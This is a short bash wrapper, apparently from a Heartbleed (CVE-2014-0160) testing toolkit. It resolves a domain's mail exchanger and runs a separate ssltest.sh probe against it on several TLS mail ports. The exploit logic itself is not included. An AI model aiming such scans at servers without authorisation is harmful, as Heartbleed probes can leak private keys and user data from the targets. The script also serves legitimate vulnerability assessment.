#!/bin/bash
# OpenMAGIC v0.2
#
# OpenSSL TLS heartbeat read overrun (CVE-2014-0160)
# Written by Francesco `ascii` Ongaro - 20140218
# (C) ISGroup SRL - http://www.isgroup.biz

function mx() {
	dig +noall +answer MX $1 | grep MX | head -n1 | awk '{ print $6; }' | sed "s/\.$//g";
}

function mta(){
	MX=`mx $1`;
	for PORT in 465 585 993 995; do
		./ssltest.sh $MX $PORT;
	done;
}

mta $1;
